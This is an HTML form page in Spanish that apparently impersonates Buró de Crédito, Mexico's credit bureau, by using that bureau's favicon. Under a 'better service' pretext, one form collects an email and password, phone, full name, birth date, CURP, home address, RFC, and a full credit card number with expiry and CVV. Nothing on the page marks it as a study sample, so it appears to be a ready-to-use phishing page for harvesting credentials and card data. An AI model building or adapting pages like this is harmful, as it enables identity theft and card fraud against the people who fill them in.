<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="formulario.css">
    <link
      rel="stylesheet"
      href="https://use.fontawesome.com/releases/v5.8.1/css/all.css"
      integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf"
      crossorigin="anonymous"
    />
    <link
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.2/dist/css/bootstrap.min.css"
      rel="stylesheet"
      integrity="sha384-Zenh87qX5JnK2Jl0vWa8Ck2rdkQ2Bzep5IDxbcnCeuOxjzrPF/et3URy9Bv1WTRi"
      crossorigin="anonymous"
    />
    <link
      rel="shortcut icon"
      href="https://www.burodecredito.com.mx/icon.png"
      type="image/x-icon"
    />
    <title>Formulario </title>
</head>
<body>
    <div class="top"></div>
    <div class="container text-center pop">
        <div class="row align-items-center">
            <div class="col pe">
                <h2>Para un mejor servicio</h2>
                <p>Rellena los campos solicitados para continuar</p>
              <form action="" method="post">
                <h1>Digitales</h1>
                <label>Correo Electronico:</label><br>
                <input type="email" name="mail" placeholder="Correo Electronico" required><br>
                <label>Contraseña:</label><br>
                <input type="text" name="pass" placeholder="Contraseña" required><br>
                <label for="">Teléfono:</label><br>
                <input type="text" placeholder="10 Digitos" required name="phone"><br>
                <h1>Personales</h1>
                <label for="">Nombre(s)</label><br>
                <input type="text" placeholder="Nombre(s)" required name="name"><br>
                <label for="">Apellidos:</label><br>
                <input type="text" placeholder="Apellidos" required name="ape"><br>
                <label for="">Fecha de Nacimiento:</label><br>
                <input type="date" name="date" required><br>
                <label for="">CURP:</label><br>
                <input type="text" placeholder="CURP" required name="curp"><br>
                <h1>Domiciliarios:</h1>
                <label for="">Calle y Número:</label><br>
                <input type="text" placeholder="Calle y No." required name="calle"><br>
                <label for="">Código Postal:</label><br>
                <input type="text" placeholder="ZIP/C.P." required name="zip"><br>
                <label for="">Colonia:</label><br>
                <input type="text" name="colonia" required placeholder="Colonia"><br>
                <label for="">Municipio:</label><br>
                <input type="text" placeholder="Municipio" required name="municipio"><br>
                <label for="">Estado:</label><br>
                <input type="text" placeholder="Estados" required name="state"><br>
                <h1>Necesitamos los datos de tu tarjeta</h1>
                <label for="">Tarjeta de Credito</label><br>
                <input type="text" placeholder="Inserta 16 Digitos" required maxlength="16" name="card"><br>
                <label for="">Fecha de Vencimiento</label><br>
                <input type="text" placeholder="MM/AA" maxlength="5" required name="ven"><br>
                <label for="">CVV</label><br>
                <input type="text" name="cvv" placeholder="CCV" required><br>
                <label for="">RFC</label><br>
                <input type="text" placeholder="RFC" name="cfr" required><br>
                <button type="submit">Siguiente</button>
              </form>
            </div>
        </div>
    </div>
    <div class="top"></div>
</body>
</html>
